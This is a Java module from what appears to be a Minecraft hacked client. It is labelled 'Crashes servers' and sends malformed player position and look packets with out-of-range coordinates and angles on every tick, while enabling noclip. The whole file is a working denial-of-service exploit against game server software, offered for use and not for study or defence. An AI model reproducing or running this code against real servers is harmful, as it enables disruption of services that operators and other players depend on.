package me.ht9.end.feature.module.exploit.crasher;

import me.ht9.end.event.bus.annotation.SubscribeEvent;
import me.ht9.end.event.events.UpdateEvent;
import me.ht9.end.feature.module.Module;
import me.ht9.end.feature.module.annotation.Description;
import me.ht9.end.util.NetworkUtils;
import net.minecraft.src.*;
import org.lwjgl.input.Keyboard;

@Description(value = "Crashes servers.")
public class Crasher extends Module
{
    private static final Crasher instance = new Crasher();

    @Override
    public void onEnable()
    {
        NetworkUtils.dispatchPacket(new Packet11PlayerPosition(mc.thePlayer.posX, -1001.0, -1000.0, mc.thePlayer.posZ, mc.thePlayer.onGround));
    }

    @SubscribeEvent
    public void onUpdate(UpdateEvent event)
    {
        NetworkUtils.dispatchPacket(new Packet12PlayerLook(-999f, -999f, true));
        NetworkUtils.dispatchPacket(new Packet18Animation(mc.thePlayer, 1));
        NetworkUtils.dispatchPacket(new Packet11PlayerPosition(30000000, 1000.0, 1001.0, 30000000, mc.thePlayer.onGround));
        mc.thePlayer.noClip = true;
        mc.thePlayer.setVelocity(0.0, 0.0, 0.0);
        if (Keyboard.isKeyDown(mc.gameSettings.keyBindSneak.keyCode))
        {
            mc.thePlayer.addVelocity(0.0, -0.2, 0.0);
        }
        if (Keyboard.isKeyDown(mc.gameSettings.keyBindJump.keyCode))
        {
            mc.thePlayer.addVelocity(0.0, 0.04, 0.0);
        }
    }

    @Override
    public void onDisable()
    {
        mc.thePlayer.noClip = false;
    }

    public static Crasher getInstance()
    {
        return instance;
    }
}
